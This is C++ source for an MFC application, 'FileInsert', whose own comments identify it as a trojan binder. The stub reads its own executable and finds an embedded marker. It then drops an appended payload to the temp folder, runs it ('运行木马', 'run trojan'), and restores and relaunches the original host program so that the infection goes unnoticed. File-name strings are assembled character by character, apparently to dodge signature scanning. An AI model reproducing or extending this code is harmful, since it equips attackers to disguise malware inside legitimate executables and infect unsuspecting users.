// FileInsert.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "FileInsert.h"
#include "FileInsertDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CFileInsertApp

BEGIN_MESSAGE_MAP(CFileInsertApp, CWinApp)
	//{{AFX_MSG_MAP(CFileInsertApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG
	ON_COMMAND(ID_HELP, CWinApp::OnHelp)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFileInsertApp construction

CFileInsertApp::CFileInsertApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CFileInsertApp object

CFileInsertApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CFileInsertApp initialization

BOOL WriteMyFile(char* pFileName, BYTE* pFileData, DWORD nFileLen)
{
	// 保存到文件
	HANDLE hFile = CreateFile(
		pFileName,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL );
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	
	DWORD dw = 0;
	if (!WriteFile(hFile, pFileData, nFileLen, &dw, NULL)) {
		CloseHandle(hFile);
		return FALSE;
	}
	CloseHandle(hFile);
	return TRUE;
}

BOOL CFileInsertApp::InitInstance()
{
//	_asm int 3;

	//查参数
	if(lstrlen(m_lpCmdLine) > 0)
	{
		//恢复原始文件
		BYTE* pSrcFileData = NULL;
		BYTE* pAddFileData = NULL;
		DWORD nSrcFileLen = 0;
		DWORD nAddFileLen = 0;
		if(!GetFileSaveInfo(&pSrcFileData, &nSrcFileLen, &pAddFileData, &nAddFileLen))
		{
			return FALSE;
		}

		//等待原始进程退出
		while(1)
		{
			if(WriteMyFile(m_lpCmdLine, pSrcFileData, nSrcFileLen))
			{
				break;
			}
			Sleep(1000);
		}

		//启动原始进程
		ShellExecute(NULL, NULL, m_lpCmdLine, NULL, NULL, SW_SHOW);
		return FALSE;
	}

	//EXE数据
	DWORD nReadLen = 0;
	char m_DllName[MAX_PATH] = {0};
	GetModuleFileName(NULL, m_DllName, 200);
	HANDLE hFile = CreateFile(m_DllName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nExeFileLen = GetFileSize(hFile, NULL);
	BYTE* pFileData = new BYTE[nExeFileLen];
	ReadFile(hFile, pFileData, nExeFileLen, &nReadLen, NULL);
	CloseHandle(hFile);

	//This
	char m_TempStr[256] = {0};
	m_TempStr[0] = 'T';
	m_TempStr[1] = 'h';
	m_TempStr[2] = 'i';
	m_TempStr[3] = 's';
	m_TempStr[4] = 0x00;

	//修改EXE数据标志
	BOOL bIsSuccess = FALSE;
	for(DWORD i = 0; i < nExeFileLen; i++)
	{
		if(memcmp(&pFileData[i], m_TempStr, 4) == 0)
		{
			if(_EXEC_FILE_ == pFileData[i + 4])
			{
				bIsSuccess = TRUE;
				break;
			}
		}
	}
	delete [] pFileData;
	if(bIsSuccess)
	{
		BYTE* pSrcFileData = NULL;
		BYTE* pAddFileData = NULL;
		DWORD nSrcFileLen = 0;
		DWORD nAddFileLen = 0;
		if(!GetFileSaveInfo(&pSrcFileData, &nSrcFileLen, &pAddFileData, &nAddFileLen))
		{
			return FALSE;
		}

		//%d.exe
		char m_TempStr[256] = {0};
		m_TempStr[0] = '%';
		m_TempStr[1] = 'd';
		m_TempStr[2] = '.';
		m_TempStr[3] = 'e';
		m_TempStr[4] = 'x';
		m_TempStr[5] = 'e';
		m_TempStr[6] = 0x00;

		//运行木马
		char m_AddFileName[256] = {0};
		GetTempPath(200, m_AddFileName);
		wsprintf(m_AddFileName + lstrlen(m_AddFileName), m_TempStr, GetCurrentProcessId());
		WriteMyFile(m_AddFileName, pAddFileData, nAddFileLen);
		ShellExecute(NULL, NULL, m_AddFileName, NULL, NULL, SW_SHOW);
		
		//运行恢复程序
		char m_ExeFileName[256] = {0};
		GetModuleFileName(NULL, m_ExeFileName, 255);

		//%dz.exe
		m_TempStr[0] = '%';
		m_TempStr[1] = 'd';
		m_TempStr[2] = 'z';
		m_TempStr[3] = '.';
		m_TempStr[4] = 'e';
		m_TempStr[5] = 'x';
		m_TempStr[6] = 'e';
		m_TempStr[7] = 0x00;

		char m_TmpFileName[256] = {0};
		GetTempPath(200, m_TmpFileName);
		wsprintf(m_TmpFileName + lstrlen(m_TmpFileName), m_TempStr, GetCurrentProcessId());
		CopyFile(m_ExeFileName, m_TmpFileName, FALSE);
		ShellExecute(NULL, NULL, m_TmpFileName, m_ExeFileName, NULL, SW_SHOW);
		return FALSE;
	}

	CFileInsertDlg dlg;
	m_pMainWnd = &dlg;
	int nResponse = dlg.DoModal();
	if (nResponse == IDOK)
	{
		// TODO: Place code here to handle when the dialog is
		//  dismissed with OK
	}
	else if (nResponse == IDCANCEL)
	{
		// TODO: Place code here to handle when the dialog is
		//  dismissed with Cancel
	}

	// Since the dialog has been closed, return FALSE so that we exit the
	//  application, rather than start the application's message pump.
	return FALSE;
}
